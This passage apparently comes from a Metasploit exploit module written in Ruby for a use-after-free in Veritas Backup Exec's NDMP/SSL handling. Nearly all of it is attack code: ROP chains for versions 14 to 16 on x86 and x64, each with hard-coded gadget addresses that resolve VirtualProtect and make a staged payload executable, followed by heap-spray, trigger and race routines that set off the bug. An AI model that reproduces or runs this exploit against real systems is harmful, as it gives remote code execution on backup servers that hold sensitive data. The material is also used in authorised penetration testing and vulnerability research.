          0xbe43269, # push rax; pop rsi; ret
          0xbefc534, # mov rcx, rbx; call r12
          0xbebd50e, # pop r13; ret
          0,
          0xbe97c4e, # mov rdx, r13; call r12
          0xbeae99d, # pop r8; ret
          0x40,      # PAGE_EXECUTE_READWRITE
          0xbe3c9c0, # test rdx, rdx; setne al; ret
          0xbe68603, # mov r9, rcx; je 0xbe68612; xor eax, eax; ret
          0xbe4929d, # ret
          0xbe9436d, # jmp rsi
          0xbea47f9, # pop r15; pop r14; pop r13; pop rbp; ret
          0,
          0,
          0,
          0,
          0xbe2184d, # pop rdi; ret
          0xbebd50e, # pop r13; ret
          0xbe9a8ac  # push rsp; and al, 0x20; mov r8d, ebx; mov rcx, rsi; call rdi
        ]
        stage_3[2] = stage_3[29] = stage_3.length * 8 + stage_4.length
        stage_3[15] = stage_3[2] + "KERNEL32.dll\0".length
        stage_3 = stage_3.pack('Q<*') + stage_4 + "KERNEL32.dll\0VirtualProtect\0"
      elsif target.opts['Version'] == 16
        stage_3 = [
          0xbe4e888, # push rax; pop rbx; ret
          0xbe01f72, # pop rax; ret
          0,
          0xbe610f0, # add rax, rcx; ret
          0xbe9c70c, # mov rcx, rax; call r12
          0xbe01c2c, # ret
          0xbeb5d8e, # jmp qword ptr [KERNEL32!LoadLibraryAStub]
          0xbea5b39, # pop r15; pop r14; pop r13; pop rbp; ret
          0,
          0,
          0,
          0,
          0xbe12ed0, # pop rdi; ret
          0xbe45a01, # pop r13; ret
          0xbeaedb0, # mov rbp, rax; call rdi
          0xbe5851a, # mov rcx, rbx; call r12
          0xbe01f72, # pop rax; ret
          0,
          0xbe610f0, # add rax, rcx; ret
          0xbe9c70c, # mov rcx, rax; call r12
          0xbefe516, # mov rdx, rcx; call r12
          0xbe9bf28, # mov rcx, rbp; call r12
          0xbeb5d28, # jmp qword ptr [KERNEL32!GetProcAddressStub]
          0xbea5b39, # pop r15; pop r14; pop r13; pop rbp; ret
          0,
          0,
          0,
          0,
          0xbe433b9, # push rax; pop rsi; ret
          0xbe5851a, # mov rcx, rbx; call r12
          0xbe45a01, # pop r13; ret
          0,
          0xbe2e55e, # mov rdx, r13; call r12
          0xbe27c76, # pop r8; ret
          0x40,      # PAGE_EXECUTE_READWRITE
          0xbe3caf0, # test rdx, rdx; setne al; ret
          0xbe68c73, # mov r9, rcx; je 0xbe68c82; xor eax, eax; ret
          0xbe01c2c, # ret
          0xbe56cad, # jmp rsi
          0xbea5b39, # pop r15; pop r14; pop r13; pop rbp; ret
          0,
          0,
          0,
          0,
          0xbe12ed0, # pop rdi; ret
          0xbe45a01, # pop r13; ret
          0xbe9ba6c  # push rsp; and al, 0x20; mov r8d, ebx; mov rcx, rsi; call rdi
        ]
        stage_3[2] = stage_3[31] = stage_3.length * 8 + stage_4.length
        stage_3[17] = stage_3[2] + "KERNEL32.dll\0".length
        stage_3 = stage_3.pack('Q<*') + stage_4 + "KERNEL32.dll\0VirtualProtect\0"
      end
    else
      if target.opts['Version'] == 14
        stage_3 = [
          0x63117dfa, # pop edi; ret
          0x63101514, # ret
          0x63116cc9, # pop esi; ret
          0x6313ba14, # jmp dword ptr [KERNEL32!LoadLibraryAStub]
          0x631017ff, # pop ebp; ret
          0x631213e6, # add esp, 0x20; ret
          0x63137a3c, # pushal; ret
          'KERN'.unpack('<L')[0],
          'EL32'.unpack('<L')[0],
          '.dll'.unpack('<L')[0],
          0,
          0x63117dfa, # pop edi; ret
          0x6311de4c, # pop edi; pop ebp; ret
          0x6311b614, # push eax; call edi
          0x63117dfa, # pop edi; ret
          0x6313b9ae, # jmp dword ptr [KERNEL32!GetProcAddressStub]
          0x63116cc9, # pop esi; ret
          0x631213e6, # add esp, 0x20; ret
          0x63137a3c, # pushal; ret
          'Virt'.unpack('<L')[0],
          'ualP'.unpack('<L')[0],
          'rote'.unpack('<L')[0],
          "ct\0\0".unpack('<L')[0],
          0x6314de45, # xchg eax, edi; ret
          0x6311db46, # push esp; pop esi; ret
          0x6311a398, # xchg eax, esi; ret
          0x63116cc9, # pop esi; ret
          0x6311f902, # pop ebx; pop ecx; ret
          0x63123d89, # push eax; call esi
          0x6316744a, # push edi; sbb al, 0x5f; pop esi; pop ebp; pop ebx; ret
          0x63101514, # ret
          0,
          0x631309f4, # pop edx; or al, 0xf6; ret
          0x40,       # PAGE_EXECUTE_READWRITE
          0x63117dfa, # pop edi; ret
          0x63101514, # ret
          0x6310185a, # pop eax; ret
          0x63139ec5, # push esp; ret
          0x63137a3c  # pushal; ret
        ]
        stage_3[31] = stage_4.length + 4
      elsif target.opts['Version'] == 15
        stage_3 = [
          0x6311e378, # pop edi; ret
          0x63101564, # ret
          0x631289b9, # pop esi; ret
          0x6319e296, # jmp dword ptr [KERNEL32!LoadLibraryA]
          0x6310184f, # pop ebp; ret
          0x6313937d, # add esp, 0x20; ret
          0x6311c618, # pushal; ret
          'KERN'.unpack('<L')[0],
          'EL32'.unpack('<L')[0],
          '.dll'.unpack('<L')[0],
          0,
          0x63198d07, # xchg eax, ebp; mov edi, 0xc483fff9; or al, 0x5e; ret
          0x6311e378, # pop edi; ret
          0x6319e23c, # jmp dword ptr [KERNEL32!GetProcessAddress]
          0x631289b9, # pop esi; ret
          0x6313937d, # add esp, 0x20; ret
          0x6311c618, # pushal; ret
          'Virt'.unpack('<L')[0],
          'ualP'.unpack('<L')[0],
          'rote'.unpack('<L')[0],
          "ct\0\0".unpack('<L')[0],
          0x631289b9, # pop esi; ret
          0x631018aa, # pop eax; ret
          0x63198446, # mov edi, eax; call esi
          0x63137496, # push esp; pop esi; ret
          0x6312c068, # xchg eax, esi; ret
          0x631289b9, # pop esi; ret
          0x6315c407, # pop ebx; pop ecx; ret
          0x63189809, # push eax; call esi
          0x631d7cca, # push edi; sbb al, 0x5f; pop esi; pop ebp; pop ebx; ret
          0x63101564, # ret
          0,
          0x63156a54, # pop edx; or al, 0xf6; ret
          0x40,       # PAGE_EXECUTE_READWRITE
          0x6311e378, # pop edi; ret
          0x63101564, # ret
          0x631018aa, # pop eax; ret
          0x6311c638, # push esp; ret
          0x6311c618  # pushal; ret
        ]
        stage_3[31] = stage_4.length + 4
      elsif target.opts['Version'] == 16
        stage_3 = [
          0x6311e3c0, # pop edi; ret
          0x63101564, # ret
          0x63128a39, # pop esi; ret
          0x6319f27c, # jmp dword ptr [KERNEL32!LoadLibraryAStub]
          0x6310184f, # pop ebp; ret
          0x631394ad, # add esp, 0x20; ret
          0x6311c69c, # pushal; ret
          'KERN'.unpack('<L')[0],
          'EL32'.unpack('<L')[0],
          '.dll'.unpack('<L')[0],
          0,
          0x6311e3c0, # pop edi; ret
          0x631018aa, # pop eax; ret
          0x6319959f, # mov ebp, eax; call edi
          0x6311e3c0, # pop edi; ret
          0x6319f21c, # jmp dword ptr [KERNEL32!GetProcessAddressStub]
          0x63128a39, # pop esi; ret
          0x631394ad, # add esp, 0x20; ret
          0x6311c69c, # pushal; ret
          'Virt'.unpack('<L')[0],
          'ualP'.unpack('<L')[0],
          'rote'.unpack('<L')[0],
          "ct\0\0".unpack('<L')[0],
          0x63128a39, # pop esi; ret
          0x631018aa, # pop eax; ret
          0x631993e6, # mov edi, eax; call esi
          0x631375e6, # push esp; pop esi; ret
          0x6312c0e8, # xchg eax, esi; ret
          0x63128a39, # pop esi; ret
          0x63133031, # pop ebx; pop ecx; ret
          0x6314a34a, # push eax; call esi
          0x631d830a, # push edi; sbb al, 0x5f; pop esi; pop ebp; pop ebx; ret
          0x63101564, # ret
          0,
          0x63157084, # pop edx; or al, 0xf6; ret
          0x40,       # PAGE_EXECUTE_READWRITE
          0x6311e3c0, # pop edi; ret
          0x63101564, # ret
          0x631018aa, # pop eax; ret
          0x63134eb6, # push esp; ret
          0x6311c69c  # pushal; ret
        ]
        stage_3[33] = stage_4.length + 4
      end
      stage_3 = stage_3.pack('L<*') + stage_4
    end

    if target.opts['Arch'] == ARCH_X64
      if target.opts['Version'] == 14
        stage_2 = [
          0xbe40d1d, # pop r12; pop rsi; ret
          0xbe1bca3, # pop r12; pop rbx; ret
          0xbe399d0, # pop r13; ret
          0xbe29954, # push rsp; and al, 0x70; mov rcx, rax; call r12
          0xbe501a7, # mov rcx, rbx; call rsi
          0xbe01f72, # pop rax; ret
          0,
          0xbe3d250, # add rax, rcx; ret
          0xbe37f75, # push rax; pop rdi; ret
          0xbe4f52c, # mov rax, qword ptr gs:[0x30]; ret
          0xbe24263, # mov rax, qword ptr [rax + 8]; ret
          0xbe1b055, # pop rbx; ret
          0xfffffffffffff000,
          0xbe501a7, # mov rcx, rbx; call rsi
          0xbe3d250, # add rax, rcx; ret
          0xbe1c2f9, # pop r12; ret
          0xbe2ab32, # pop r8; ret
          0xbe2987c, # mov rcx, rax; call r12
          0xbe1b055, # pop rbx; ret
          0xbe2ab32, # pop r8; ret
          0xbe45935, # mov rdx, rdi; call rbx
          0xbe01a29, # ret
          0xbe2ab32, # pop r8; ret
          0,
          0xbe4fa46, # jmp qword ptr [MSVCR100!memcpy]
          0xbe2987c, # mov rcx, rax; call r12
          0xbe1cfc0  # mov rsp, r11; pop r12; ret (note need for extra ret at start of stage 3)
        ]
      elsif target.opts['Version'] == 15
        stage_2 = [
          0xbe1e18e, # pop r12; pop rdi; ret
          0xbebd50e, # pop r13; ret
          0xbebc3fd, # pop r14; pop rbp; ret
          0xbe9a8ac, # push rsp; and al, 0x20; mov r8d, ebx; mov rcx, rsi; call rdi
          0xbe9ad68, # mov rcx, rbp; call r12
          0xbe087c8, # pop rax; ret
          0,
          0xbe60dc0, # add rax, rcx; ret
          0xbe43269, # push rax; pop rsi; ret
          0xbebd24c, # mov rax, qword ptr gs:[0x30]; ret
          0xbe3b0b3, # mov rax, qword ptr [rax + 8]; ret
          0xbe1d923, # pop r12; pop rbx; ret
          0xfffffffffffff000,
          0xbe27c76, # pop r8; ret
          0xbe45511, # mov rcx, r12; call rbx
          0xbe60dc0, # add rax, rcx; ret
          0xbe1df29, # pop r12; ret
          0xbe27c76, # pop r8; ret
          0xbe9b54c, # mov rcx, rax; call r12
          0xbe01f72, # pop rax; ret
          0xbe27c76, # pop r8; ret
          0xbe4164c, # mov rdx, rsi; call rax
          0xbeae99d, # pop r8; ret
          0,
          0xbebda22, # jmp qword ptr [MSVCR100!memcpy]
          0xbe9b627, # mov rcx, rax; call r12
          0xbeeb621  # push rcx; pop rsp; ret
        ]
      elsif target.opts['Version'] == 16
        stage_2 = [
          0xbe1e18e, # pop r12; pop rdi; ret
          0xbe45a01, # pop r13; ret
          0xbe2a433, # pop r14; pop rbp; ret
          0xbe9ba6c, # push rsp; and al, 0x20; mov r8d, ebx; mov rcx, rsi; call rdi
          0xbe9bf28, # mov rcx, rbp; call r12
          0xbe01f72, # pop rax; ret
          0,
          0xbe610f0, # add rax, rcx; ret
          0xbe433b9, # push rax; pop rsi; ret
          0xbebe74c, # mov rax, qword ptr gs:[0x30]; ret
          0xbe3b1e3, # mov rax, qword ptr [rax + 8]; ret
          0xbe1d923, # pop r12; pop rbx; ret
          0xfffffffffffff000,
          0xbe27c76, # pop r8; ret
          0xbe45681, # mov rcx, r12; call rbx
          0xbe610f0, # add rax, rcx; ret
          0xbe1df29, # pop r12; ret
          0xbe27c76, # pop r8; ret
          0xbe9c70c, # mov rcx, rax; call r12
          0xbe01f72, # pop rax; ret
          0xbe27c76, # pop r8; ret
          0xbe4179c, # mov rdx, rsi; call rax
          0xbe27c76, # pop r8; ret
          0,
          0xbebef22, # jmp qword ptr [MSVCR100!memcpy]
          0xbe9c70c, # mov rcx, rax; call r12
          0xbeed611  # push rcx; pop rsp; ret
        ]
      end
      stage_2[6] = (stage_2.length - 4) * 8
      stage_2[23] = stage_3.length
      stage_2 = stage_2.pack('Q<*') + stage_3
    else
      if target.opts['Version'] == 14
        stage_2 = [
          0x63143720, # mov eax, dword ptr fs:[0x18]; ret
          0x6311efa4, # mov eax, dword ptr [eax + 4]; ret
          0x63129b75, # pop edi; pop ecx; ret
          0xfffffff0,
          0x100000000 - 0x2000,
          0x63122eea, # and eax, edi; pop edi; pop esi; add esp, 0xc; ret
          0x63129b75, # pop edi; pop ecx; ret
          0x6310185a, # pop eax; ret
          0,
          0,
          0,
          0x63133912, # add eax, ecx; ret
          0x63152ded, # mov ebx, eax; call esi
          0x631309f4, # pop edx; or al, 0xf6; ret
          0x6314cfa1, # xchg eax, esp; ret
          0x6311db46, # push esp; pop esi; ret
          0x6310185a, # pop eax; ret
          0x6310185a, # pop eax; ret
          0x631171d2, # mov ecx, esi; call eax
          0x6310185a, # pop eax; ret
          0,
          0x63133912, # add eax, ecx; ret
          0x631257f4, # push ebx; call edi
          0x631546eb, # pop edi; ret
          0x631543cb, # pop ebp; pop esi; pop edi; ret
          0x63116faf, # pop ebx; ret
          0x63143aec, # jmp dword ptr [MSVCR100!memcpy]
          0x6315dde0, # cld; ret
          0x63137a3c, # pushal; ret
          0
        ]
        stage_2[20] = (stage_2.length - 16) * 4
        stage_2[29] = stage_3.length
      elsif target.opts['Version'] == 15
        stage_2 = [
          0x631a6220, # mov eax, dword ptr fs:[0x18]; ret
          0x6312e404, # mov eax, dword ptr [eax + 4]; ret
          0x6313031d, # pop ebp; pop ecx; ret
          0x100000000 - 0x2000,
          0xfffffff0,
          0x6316c73a, # and eax, ecx; pop esi; ret
          0x6315c407, # pop ebx; pop ecx; ret
          0x63192b17, # add eax, ebp; ret
          0x63189809, # push eax; call esi
          0x63156a54, # pop edx; or al, 0xf6; ret
          0x6312c933, # xchg eax, esp; ret
          0x63137496, # push esp; pop esi; ret
          0x6314172a, # pop eax; ret
          0,
          0x6317e87d, # add eax, esi; pop edi; pop esi; pop ebx; ret
          0x63156dd8, # pop edi; pop ebp; pop esi; ret
          0,
          0,
          0x631729cd, # pop ebx; ret
          0x631a65ec, # jmp dword ptr [MSVCR100!memcpy]
          0x6311e250, # cld; ret
          0x6311c618, # pushal; ret
          0
        ]
        stage_2[13] = (stage_2.length - 12) * 4
        stage_2[22] = stage_3.length
      elsif target.opts['Version'] == 16
        stage_2 = [
          0x631a7200, # mov eax, dword ptr fs:[0x18]; ret
          0x6312e4a4, # mov eax, dword ptr [eax + 4]; ret
          0x63128afc, # pop ecx; ret
          0xfffffff0,
          0x6316d13a, # and eax, ecx; pop esi; ret
          0x63133031, # pop ebx; pop ecx; ret
          0x63128afc, # pop ecx; ret
          0x100000000 - 0x2000,
          0x63142860, # add eax, ecx; ret
          0x6314a34a, # push eax; call esi
          0x63157084, # pop edx; or al, 0xf6; ret
          0x6311c6c0, # xchg eax, esp; ret
          0x631375e6, # push esp; pop esi; ret
          0x631018aa, # pop eax; ret
          0,
          0x63135f56, # add eax, esi; add eax, ecx; pop esi; ret
          0,
          0x63157408, # pop edi; pop ebp; pop esi; ret
          0x63157408, # pop edi; pop ebp; pop esi; ret
          0,
          0,
          0x63181046, # sub eax, ecx; pop ebx; ret
          0x631a75cc, # jmp dword ptr [MSVCR100!memcpy]
          0x6311e298, # cld; ret
          0x6311c69c, # pushal; ret
          0
        ]
        stage_2[14] = (stage_2.length - 13) * 4
        stage_2[25] = stage_3.length
      end
      stage_2 = stage_2.pack('L<*') + stage_3
    end

    stage_2 + rand_text(stage_2.length & 1)
  end

  #
  # Attempt to overwrite the freed BIO struct with stage 1 and trigger the use-after-free.
  #
  def attempt_triggers(s, spray_socks, spray_msg)
    datastore['NumTriggerAttempts'].times do |x|
      print_status('Spraying stage 1...')
      (1..2).each do |phase|
        spray_socks.each do |ss|
          if phase == 1
            return false unless ss.prepare_and_write_ndmp_msg(spray_msg, false, 50)
            return true if @payload_connected || session_created?
          else
            50.times do
              return false unless ss.read_ndmp_msg(spray_msg.header.type)
              return true if @payload_connected || session_created?
            end
          end
        end
      end
      sleep(1)
      return true if @payload_connected || session_created?

      # Send a certain amount of data per trigger attempt so that stage 1 will always end
      # up jumping into the TLS/SSLv2 record at an expected location. The general idea is
      # that the first write will complete Backup Exec's first recv operation, the second
      # fills the buffer back up to an 8/4-byte aligned position, and the rest moves
      # through the retsled
      print_status("Triggering UAF, attempt #{x + 1}/#{datastore['NumTriggerAttempts']}...")
      trigger = if target.opts['Version'] == 14
        if x == 0
          # A maximum of 5 bytes are always read at first, so just send them all at once
          "\x16\x03\x01\x10\x00"
        elsif x == 1
          # Skip over TLS header structure
          rand_text((target.opts['Arch'] == ARCH_X64 ? 0x18 : 0x10) - 5)
        else
          # Skip over a ROP NOP
          rand_text(target.opts['Arch'] == ARCH_X64 ? 8 : 4)
        end
      else
        if x == 0
          # A maximum of 11 bytes are always read at first, so just send them all at once
          "\x90\x00\x01\x03\x03" + rand_text(11 - 5)
        elsif x == 1
          # Skip over SSLv2 header structure
          rand_text((target.opts['Arch'] == ARCH_X64 ? 0x20 : 0x10) - 11)
        else
          # Skip over a ROP NOP
          rand_text(target.opts['Arch'] == ARCH_X64 ? 8 : 4)
        end
      end
      return false unless s.raw_sendall(trigger, 0)
      sleep(1)
      return true if @payload_connected || session_created?
    end

    nil
  end

  #
  # Attempt to overwrite the freed BIO struct with stage 1 and implicitly trigger the
  # use-after-free in a race.
  #
  # For non-Windows 8+ targets, we need to race Backup Exec after the BIO struct is freed.
  # This is because these versions of Windows overwrite the start of freed objects on the
  # heap with the next offset in the freelist. We need to then overwrite this with our
  # stage 1 spray otherwise Backup Exec will crash upon attempting to call the BIO
  # struct's read callback upon re-entering SSL mode. This is less successful than the
  # Windows 8+ case (which doesn't use a freelist, instead using a free bitmap), but it
  # still works OK.
  #
  def attempt_race(s, spray_socks, spray_msg, ca_cert_id)
    print_status('Spraying stage 1 while racing re-entering SSL mode on main socket...')
    do_simple_ssl_request(s, SSLRequest::Opcode.start_ssl, ca_cert_id) do |is_pre|
      unless is_pre
        200.times do
          spray_socks.each do |ss|
            ss.prepare_and_write_ndmp_msg(spray_msg, 200)
            return true if @payload_connected || session_created?
          end
        end
      end
    end
    sleep(1)

    @payload_connected || session_created?
  end
end